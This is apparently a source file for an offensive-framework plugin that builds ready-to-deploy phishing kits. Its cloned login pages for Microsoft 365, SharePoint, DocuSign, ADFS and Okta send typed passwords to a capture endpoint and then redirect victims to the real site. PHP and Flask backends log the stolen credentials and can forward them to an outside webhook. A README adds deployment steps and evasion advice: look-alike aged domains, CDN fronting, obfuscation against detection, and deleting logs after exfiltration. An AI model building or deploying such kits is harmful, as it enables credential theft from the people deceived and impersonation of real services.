"""
Erebus Plugin - Phishing Page Generator

Generates static HTML phishing pages that mimic common enterprise login portals.
Includes a lightweight credential capture backend stub (PHP or Python/Flask).

Supported templates:
  o365        - Microsoft 365 / Outlook Web App login
  sharepoint  - SharePoint "file sharing" access gate
  docusign    - DocuSign document signing prompt
  adfs        - Active Directory Federation Services login
  okta        - Okta SSO login page

Architecture:
  1. HTML page (pure static) - victim fills credentials, JS POST to /capture
  2. capture.php / capture.py - logs creds to disk, optional GoPhish webhook,
     optional Mythic event feed callback
  3. Redirect: after POST, victim gets 302 to the real site (transparent to victim)

OPSEC Notes:
  Detection Surface:
    - Phishing domain reputation (URLscan, VT, Umbrella)
    - JS POST to /capture endpoint - visible in browser devtools / proxy
    - GoPhish webhook POST if enabled - additional outbound connection
    - HTML source similarity to known phishing kits (YARA on HTML)
  Behavioral Indicators:
    - Login form with non-matching domain in action= URL
    - JS that captures input and sends to attacker infrastructure
  Hardening:
    - [MALLEABLE] Host on aged domain matching target org theme
    - [MALLEABLE] Add Cloudflare or CDN fronting - hides real IP
    - [MALLEABLE] Replace GoPhish webhook with encrypted DB write
    - [MALLEABLE] Add CAPTCHA / rate limiting to frustrate automated scanners
    - [MALLEABLE] Use CSS obfuscation to break simple HTML-similarity matching

Reference: T1566.002 - Spearphishing Link; T1056.003 - Web Portal Capture
"""

import pathlib
import textwrap
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


# ---------------------------------------------------------------------------
# O365 / Outlook Web App template
# ---------------------------------------------------------------------------
_O365_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to your account</title>
  <style>
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{ font-family: "Segoe UI", Arial, sans-serif; background: #f2f2f2; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
    .card {{ background: #fff; padding: 44px 44px 36px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,.2); }}
    .logo {{ width: 108px; margin-bottom: 16px; }}
    h1 {{ font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 16px; }}
    .subtitle {{ font-size: 13px; color: #6e6e6e; margin-bottom: 24px; }}
    input[type=email], input[type=password] {{
      width: 100%; border: 1px solid #8a8a8a; padding: 8px 10px; font-size: 15px;
      outline: none; margin-bottom: 20px;
    }}
    input:focus {{ border-color: #0078d4; box-shadow: 0 0 0 1px #0078d4; }}
    .btn {{ background: #0078d4; color: #fff; border: none; width: 100%; padding: 10px; font-size: 15px; cursor: pointer; }}
    .btn:hover {{ background: #106ebe; }}
    .footer {{ font-size: 12px; color: #6e6e6e; margin-top: 28px; text-align: center; }}
    .footer a {{ color: #0078d4; text-decoration: none; }}
    #err {{ color: #c72a1c; font-size: 13px; margin-bottom: 10px; display: none; }}
  </style>
</head>
<body>
  <div class="card">
    <svg class="logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
      <text y="20" font-size="22" font-family="Segoe UI" fill="#0078d4" font-weight="600">Microsoft</text>
    </svg>
    <h1>Sign in</h1>
    <p class="subtitle">{email_hint}</p>
    <form id="lf" autocomplete="on">
      <div id="err">Your account or password is incorrect.</div>
      <input type="email" id="u" name="loginfmt" placeholder="Email, phone, or Skype" required autofocus>
      <input type="password" id="p" name="passwd" placeholder="Password" required>
      <button type="submit" class="btn">Sign in</button>
    </form>
    <div class="footer">
      <a href="#">Can't access your account?</a>
    </div>
  </div>
  <script>
  document.getElementById("lf").addEventListener("submit", function(e) {{
    e.preventDefault();
    var u = document.getElementById("u").value;
    var p = document.getElementById("p").value;
    fetch("{capture_endpoint}", {{
      method: "POST",
      headers: {{"Content-Type": "application/json"}},
      body: JSON.stringify({{username: u, password: p, template: "o365"}})
    }}).then(function() {{
      window.location.href = "{redirect_url}";
    }}).catch(function() {{
      document.getElementById("err").style.display = "block";
    }});
  }});
  </script>
</body>
</html>
"""

# ---------------------------------------------------------------------------
# SharePoint "secure file" access gate template
# ---------------------------------------------------------------------------
_SHAREPOINT_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Shared Document - Sign In Required</title>
  <style>
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{ font-family: "Segoe UI", Arial, sans-serif; background: #f3f2f1; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
    .wrap {{ max-width: 480px; width: 100%; }}
    .banner {{ background: #0078d4; color: #fff; padding: 12px 24px; font-size: 15px; display: flex; align-items: center; gap: 12px; }}
    .banner strong {{ font-size: 18px; }}
    .card {{ background: #fff; padding: 36px 40px; box-shadow: 0 1px 4px rgba(0,0,0,.15); }}
    .file-box {{ background: #f3f2f1; border-left: 4px solid #0078d4; padding: 12px 16px; margin-bottom: 24px; font-size: 14px; }}
    .file-box .name {{ font-weight: 600; color: #1b1b1b; }}
    .file-box .meta {{ color: #605e5c; font-size: 12px; margin-top: 4px; }}
    input {{ width: 100%; border: 1px solid #8a8a8a; padding: 9px 10px; font-size: 14px; margin-bottom: 16px; outline: none; }}
    input:focus {{ border-color: #0078d4; }}
    .btn {{ background: #0078d4; color: #fff; border: none; width: 100%; padding: 10px; font-size: 14px; cursor: pointer; }}
    .note {{ font-size: 12px; color: #605e5c; margin-top: 16px; text-align: center; }}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="banner">
      <strong>SharePoint</strong> - Secure File Access
    </div>
    <div class="card">
      <div class="file-box">
        <div class="name">{doc_name}</div>
        <div class="meta">Shared by {sender_name} · Requires authentication</div>
      </div>
      <p style="font-size:14px;margin-bottom:20px;color:#323130;">
        Sign in with your work account to access this document.
      </p>
      <form id="lf">
        <input type="email" id="u" placeholder="Work email address" required autofocus>
        <input type="password" id="p" placeholder="Password" required>
        <button type="submit" class="btn">Access Document</button>
      </form>
      <p class="note">By signing in you agree to the Microsoft Services Agreement.</p>
    </div>
  </div>
  <script>
  document.getElementById("lf").addEventListener("submit", function(e) {{
    e.preventDefault();
    fetch("{capture_endpoint}", {{
      method: "POST",
      headers: {{"Content-Type": "application/json"}},
      body: JSON.stringify({{username: document.getElementById("u").value, password: document.getElementById("p").value, template: "sharepoint"}})
    }}).then(function() {{ window.location.href = "{redirect_url}"; }});
  }});
  </script>
</body>
</html>
"""

# ---------------------------------------------------------------------------
# DocuSign signing prompt template
# ---------------------------------------------------------------------------
_DOCUSIGN_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>DocuSign - Please sign the document</title>
  <style>
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{ font-family: Arial, sans-serif; background: #f7f7f7; }}
    .header {{ background: #ffb000; padding: 12px 32px; display: flex; align-items: center; gap: 12px; }}
    .header img {{ width: 36px; }}
    .header span {{ font-size: 22px; font-weight: 700; color: #333; }}
    .main {{ max-width: 500px; margin: 60px auto; background: #fff; padding: 40px; box-shadow: 0 1px 5px rgba(0,0,0,.15); }}
    .icon {{ font-size: 48px; text-align: center; margin-bottom: 20px; }}
    h2 {{ font-size: 20px; text-align: center; color: #333; margin-bottom: 8px; }}
    .sub {{ font-size: 14px; color: #666; text-align: center; margin-bottom: 28px; }}
    input {{ width: 100%; border: 1px solid #ccc; padding: 10px 12px; font-size: 14px; margin-bottom: 14px; outline: none; border-radius: 3px; }}
    input:focus {{ border-color: #ffb000; }}
    .btn {{ background: #ffb000; border: none; width: 100%; padding: 12px; font-size: 15px; font-weight: 700; color: #fff; cursor: pointer; border-radius: 3px; }}
    .sec {{ font-size: 11px; color: #999; text-align: center; margin-top: 20px; }}
  </style>
</head>
<body>
  <div class="header">
    <span>DocuSign</span>
  </div>
  <div class="main">
    <div class="icon">📄</div>
    <h2>Please Review &amp; Sign</h2>
    <p class="sub">{sender_name} has sent you a document to sign:<br><strong>{doc_name}</strong></p>
    <form id="lf">
      <input type="email" id="u" placeholder="Your email address" required autofocus>
      <input type="password" id="p" placeholder="DocuSign password" required>
      <button type="submit" class="btn">ACCESS DOCUMENT</button>
    </form>
    <p class="sec">🔒 This document is protected by DocuSign security</p>
  </div>
  <script>
  document.getElementById("lf").addEventListener("submit", function(e) {{
    e.preventDefault();
    fetch("{capture_endpoint}", {{
      method: "POST",
      headers: {{"Content-Type": "application/json"}},
      body: JSON.stringify({{username: document.getElementById("u").value, password: document.getElementById("p").value, template: "docusign"}})
    }}).then(function() {{ window.location.href = "{redirect_url}"; }});
  }});
  </script>
</body>
</html>
"""

# ---------------------------------------------------------------------------
# ADFS login template
# ---------------------------------------------------------------------------
_ADFS_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign In</title>
  <style>
    body {{ font-family: "Segoe UI", Arial, sans-serif; background: #eef0f3; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }}
    .container {{ display: flex; max-width: 900px; width: 100%; background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,.15); }}
    .left {{ flex: 1; background: linear-gradient(135deg, #005a9e 0%, #0078d4 100%); padding: 60px 40px; color: #fff; }}
    .left h1 {{ font-size: 28px; margin-bottom: 12px; }}
    .left p {{ font-size: 14px; opacity: .85; line-height: 1.6; }}
    .right {{ width: 360px; padding: 60px 40px; }}
    .right h2 {{ font-size: 20px; color: #1b1b1b; margin-bottom: 24px; }}
    input {{ width: 100%; border: 1px solid #ccc; padding: 9px 10px; font-size: 14px; margin-bottom: 14px; outline: none; }}
    input:focus {{ border-color: #0078d4; }}
    .btn {{ background: #0078d4; color: #fff; border: none; width: 100%; padding: 10px; font-size: 14px; cursor: pointer; }}
    .help {{ font-size: 12px; color: #0078d4; text-decoration: none; display: block; margin-top: 12px; text-align: right; }}
  </style>
</head>
<body>
  <div class="container">
    <div class="left">
      <h1>{org_name}</h1>
      <p>Sign in with your organizational account to access internal resources, email, and collaboration tools.</p>
    </div>
    <div class="right">
      <h2>Sign in</h2>
      <form id="lf">
        <input type="text" id="u" name="UserName" placeholder="username@{domain}" required autofocus>
        <input type="password" id="p" name="Password" placeholder="Password" required>
        <button type="submit" class="btn">Sign in</button>
      </form>
      <a href="#" class="help">Forgot your password?</a>
    </div>
  </div>
  <script>
  document.getElementById("lf").addEventListener("submit", function(e) {{
    e.preventDefault();
    fetch("{capture_endpoint}", {{
      method: "POST",
      headers: {{"Content-Type": "application/json"}},
      body: JSON.stringify({{username: document.getElementById("u").value, password: document.getElementById("p").value, template: "adfs"}})
    }}).then(function() {{ window.location.href = "{redirect_url}"; }});
  }});
  </script>
</body>
</html>
"""

# ---------------------------------------------------------------------------
# Okta SSO template
# ---------------------------------------------------------------------------
_OKTA_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign In - {org_name}</title>
  <style>
    body {{ font-family: -apple-system, Arial, sans-serif; background: #f4f4f4; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }}
    .card {{ background: #fff; padding: 48px 44px 40px; width: 400px; box-shadow: 0 2px 10px rgba(0,0,0,.1); border-radius: 4px; }}
    .logo {{ font-size: 26px; font-weight: 700; color: #00297a; margin-bottom: 4px; }}
    .org {{ font-size: 14px; color: #6b6b6b; margin-bottom: 32px; }}
    label {{ display: block; font-size: 13px; font-weight: 600; color: #2d2d2d; margin-bottom: 6px; }}
    input {{ width: 100%; border: 1px solid #ddd; padding: 10px 12px; font-size: 14px; margin-bottom: 20px; border-radius: 3px; outline: none; }}
    input:focus {{ border-color: #0061d5; box-shadow: 0 0 0 2px rgba(0,97,213,.2); }}
    .btn {{ background: #0061d5; color: #fff; border: none; width: 100%; padding: 12px; font-size: 14px; font-weight: 600; cursor: pointer; border-radius: 3px; }}
    .help {{ font-size: 13px; color: #0061d5; text-align: center; display: block; margin-top: 20px; text-decoration: none; }}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">Okta</div>
    <div class="org">{org_name} - Single Sign-On</div>
    <form id="lf">
      <label for="u">Username</label>
      <input type="text" id="u" placeholder="username@{domain}" required autofocus>
      <label for="p">Password</label>
      <input type="password" id="p" placeholder="Password" required>
      <button type="submit" class="btn">Sign In</button>
    </form>
    <a href="#" class="help">Forgot password?</a>
  </div>
  <script>
  document.getElementById("lf").addEventListener("submit", function(e) {{
    e.preventDefault();
    fetch("{capture_endpoint}", {{
      method: "POST",
      headers: {{"Content-Type": "application/json"}},
      body: JSON.stringify({{username: document.getElementById("u").value, password: document.getElementById("p").value, template: "okta"}})
    }}).then(function() {{ window.location.href = "{redirect_url}"; }});
  }});
  </script>
</body>
</html>
"""

# ---------------------------------------------------------------------------
# Credential capture backend stubs
# ---------------------------------------------------------------------------
_PHP_CAPTURE = """\
<?php
// Erebus Phishing Capture - PHP backend
// Deploy alongside index.html. Listens on POST /capture.
// [MALLEABLE] Replace flat-file log with DB write, Slack webhook, etc.

$log_file  = __DIR__ . "/captures.log";
$gophish_webhook = "{gophish_webhook}";   // empty = disabled
$redirect  = "{redirect_url}";

$raw  = file_get_contents("php://input");
$data = json_decode($raw, true);

if (!isset($data['username']) || !isset($data['password'])) {{
    http_response_code(400);
    exit;
}}

$line = date("Y-m-d H:i:s") . "\\t"
      . $_SERVER['REMOTE_ADDR'] . "\\t"
      . addslashes($data['template'] ?? 'unknown') . "\\t"
      . addslashes($data['username']) . "\\t"
      . addslashes($data['password']) . "\\n";

file_put_contents($log_file, $line, FILE_APPEND | LOCK_EX);

// GoPhish webhook integration
if (!empty($gophish_webhook)) {{
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => 'Content-Type: application/json',
        'content' => json_encode([
            'email'    => $data['username'],
            'password' => $data['password'],
            'ip'       => $_SERVER['REMOTE_ADDR'],
        ]),
        'timeout' => 3,
    ]]);
    @file_get_contents($gophish_webhook, false, $ctx);
}}

http_response_code(200);
echo json_encode(['status' => 'ok']);
"""

_PYTHON_CAPTURE = """\
#!/usr/bin/env python3
\"\"\"
Erebus Phishing Capture - Python/Flask backend
Run: pip install flask; python capture.py
[MALLEABLE] Replace flat-file log with DB write, Slack webhook, etc.
\"\"\"
import json
import datetime
import os
import urllib.request
from flask import Flask, request, jsonify

app = Flask(__name__)
LOG_FILE        = "captures.log"
GOPHISH_WEBHOOK = "{gophish_webhook}"   # empty = disabled
REDIRECT_URL    = "{redirect_url}"

@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(force=True, silent=True) or {{}}
    username = data.get("username", "")
    password = data.get("password", "")
    template = data.get("template", "unknown")

    line = "\\t".join([
        datetime.datetime.now().isoformat(),
        request.remote_addr,
        template,
        username,
        password,
    ]) + "\\n"

    with open(LOG_FILE, "a") as f:
        f.write(line)

    if GOPHISH_WEBHOOK:
        try:
            req = urllib.request.Request(
                GOPHISH_WEBHOOK,
                data=json.dumps({{"email": username, "password": password, "ip": request.remote_addr}}).encode(),
                headers={{"Content-Type": "application/json"}},
                method="POST",
            )
            urllib.request.urlopen(req, timeout=3)
        except Exception:
            pass

    return jsonify({{"status": "ok"}}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
"""

_README = """\
# Erebus Phishing Kit

## Files
- `index.html`   - phishing page (serve at /)
- `capture.php`  - PHP credential capture (serve at /capture)
- `capture.py`   - Python/Flask credential capture alternative
- `captures.log` - credential log (created at runtime, keep private)

## Deployment (Apache + PHP)
```
apt install apache2 php libapache2-mod-php
cp index.html /var/www/html/index.html
cp capture.php /var/www/html/capture.php
chmod 600 /var/www/html/captures.log
certbot --apache -d {domain}
```

## Deployment (Python/Flask)
```
pip install flask
python capture.py &   # runs on 0.0.0.0:8080
# Reverse proxy port 443 → 8080 via Nginx or Caddy
```

## GoPhish Integration
Set GOPHISH_WEBHOOK in capture.php / capture.py to your GoPhish campaign
webhook URL. Credentials will be POSTed to GoPhish in addition to the log.

## OPSEC
- Host on aged domain matching target org theme
- Use Cloudflare / CDN fronting to hide real server IP
- Rotate domain after each campaign - never reuse after burn
- Delete captures.log from server immediately after exfil
"""

_HTML_TEMPLATES: Dict[str, str] = {
    "o365":       _O365_HTML,
    "sharepoint": _SHAREPOINT_HTML,
    "docusign":   _DOCUSIGN_HTML,
    "adfs":       _ADFS_HTML,
    "okta":       _OKTA_HTML,
}


class PhishingPagePlugin(ErebusPlugin):
    """Generate static HTML phishing pages mimicking enterprise login portals."""

    metadata = PluginMetadata(
        name="Phishing Page Generator",
        version="1.0.0",
        category=PluginCategory.TRIGGER,
        description="Generate O365/SharePoint/DocuSign/ADFS/Okta phishing pages with credential capture backend",
        author="Whispergate",
    )

    def get_metadata(self) -> PluginMetadata:
        return self.metadata

    def register(self) -> Dict[str, Callable]:
        return {
            "create_phishing_page": self.create_phishing_page,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return True, None

    def on_load(self):
        pass

    # ------------------------------------------------------------------ #

    def create_phishing_page(
        self,
        output_dir: str,
        template: str = "o365",
        org_name: str = "Acme Corporation",
        domain: str = "acme.com",
        sender_name: str = "IT Support",
        doc_name: str = "Q4_Report_Final.pdf",
        capture_endpoint: str = "/capture",
        redirect_url: str = "https://www.office.com",
        gophish_webhook: str = "",
        email_hint: str = "",
        include_php: bool = True,
        include_python: bool = True,
    ) -> Dict[str, pathlib.Path]:
        """Generate a phishing kit with HTML lure page and credential capture backends.

        All files are written to output_dir. Deploy the whole directory to a web server.
        The HTML page POSTs credentials to capture_endpoint, then redirects the victim
        to redirect_url (the real service) - transparent to the victim.

        Args:
            output_dir:        Directory to write kit files into.
            template:          Phishing page template. One of:
                               "o365", "sharepoint", "docusign", "adfs", "okta"
            org_name:          Organization name shown in page header / title.
            domain:            Email domain shown as placeholder (e.g. "acme.com").
            sender_name:       "Shared by ..." name for SharePoint/DocuSign templates.
            doc_name:          Document name for SharePoint/DocuSign templates.
            capture_endpoint:  URL of the credential capture handler (default: "/capture").
                               If hosting PHP, this is served by capture.php at /capture.
            redirect_url:      URL to redirect victim to after credential capture.
                               Should be the real login portal for the spoofed service.
            gophish_webhook:   Optional GoPhish campaign webhook URL. If set, creds are
                               also POSTed to GoPhish alongside the local log.
            email_hint:        Subtitle shown below "Sign in" in O365 template
                               (e.g. "Use your work or school account").
            include_php:       Generate capture.php backend (default True).
            include_python:    Generate capture.py Flask backend (default True).

        Returns:
            Dict mapping file role → Path:
              "html"   → index.html
              "php"    → capture.php (if include_php)
              "python" → capture.py  (if include_python)
              "readme" → README.md
        """
        out = pathlib.Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)

        template = template.lower()
        html_tmpl = _HTML_TEMPLATES.get(template)
        if html_tmpl is None:
            raise ValueError(
                f"Unknown template '{template}'. "
                f"Valid options: {', '.join(_HTML_TEMPLATES.keys())}"
            )

        results: Dict[str, pathlib.Path] = {}

        # ── HTML page ────────────────────────────────────────────────────────
        html = html_tmpl.format(
            org_name=org_name,
            domain=domain,
            sender_name=sender_name,
            doc_name=doc_name,
            capture_endpoint=capture_endpoint,
            redirect_url=redirect_url,
            email_hint=email_hint or "Use your work or school account",
        )
        p = out / "index.html"
        p.write_text(html, encoding="utf-8")
        results["html"] = p

        # ── PHP capture backend ───────────────────────────────────────────────
        if include_php:
            php = _PHP_CAPTURE.format(
                gophish_webhook=gophish_webhook,
                redirect_url=redirect_url,
            )
            p = out / "capture.php"
            p.write_text(php, encoding="utf-8")
            results["php"] = p

        # ── Python/Flask capture backend ──────────────────────────────────────
        if include_python:
            py = _PYTHON_CAPTURE.format(
                gophish_webhook=gophish_webhook,
                redirect_url=redirect_url,
            )
            p = out / "capture.py"
            p.write_text(py, encoding="utf-8")
            results["python"] = p

        # ── README ────────────────────────────────────────────────────────────
        readme = _README.format(domain=domain)
        p = out / "README.md"
        p.write_text(readme, encoding="utf-8")
        results["readme"] = p

        return results


_plugin = PhishingPagePlugin()

if __name__ == "__main__":
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
